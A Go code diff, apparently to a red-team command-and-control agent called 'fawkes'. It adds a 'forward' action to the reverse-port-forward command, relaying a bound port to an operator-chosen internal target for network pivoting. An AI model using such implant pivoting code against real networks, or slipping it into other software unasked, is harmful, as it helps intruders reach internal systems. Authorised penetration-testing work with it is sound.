@@ -2,6 +2,7 @@ package commands
 
 import (
 	"encoding/json"
+	"fmt"
 
 	"fawkes/pkg/rpfwd"
 	"fawkes/pkg/structs"
@@ -33,8 +34,11 @@ func (c *RpfwdCommand) Description() string {
 
 func (c *RpfwdCommand) Execute(task structs.Task) structs.CommandResult {
 	var params struct {
-		Action string `json:"action"`
-		Port   int    `json:"port"`
+		Action      string `json:"action"`
+		Port        int    `json:"port"`
+		TargetIP    string `json:"target_ip"`
+		TargetPort  int    `json:"target_port"`
+		BindAddress string `json:"bind_address"`
 	}
 
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
@@ -54,13 +58,27 @@ func (c *RpfwdCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 		return successf("[+] Reverse port forward started — listening on 0.0.0.0:%d", port)
 
+	case "forward":
+		if params.TargetIP == "" || params.TargetPort == 0 {
+			return errorResult("target_ip and target_port are required for forward action")
+		}
+		targetAddr := fmt.Sprintf("%s:%d", params.TargetIP, params.TargetPort)
+		bindAddr := params.BindAddress
+		if bindAddr == "" {
+			bindAddr = "0.0.0.0"
+		}
+		if err := rpfwdManagerInstance.StartForward(port, targetAddr, bindAddr); err != nil {
+			return errorf("Failed to start forward on port %d: %v", port, err)
+		}
+		return successf("[+] Forward port forward started — %s:%d → %s", bindAddr, port, targetAddr)
+
 	case "stop":
 		if err := rpfwdManagerInstance.Stop(port); err != nil {
-			return errorf("Failed to stop rpfwd on port %d: %v", port, err)
+			return errorf("Failed to stop port forward on port %d: %v", port, err)
 		}
-		return successf("[+] Reverse port forward on port %d stopped", port)
+		return successf("[+] Port forward on port %d stopped", port)
 
 	default:
-		return errorf("Unknown action: %s (use 'start' or 'stop')", params.Action)
+		return errorf("Unknown action: %s (use 'start', 'forward', or 'stop')", params.Action)
 	}
 }
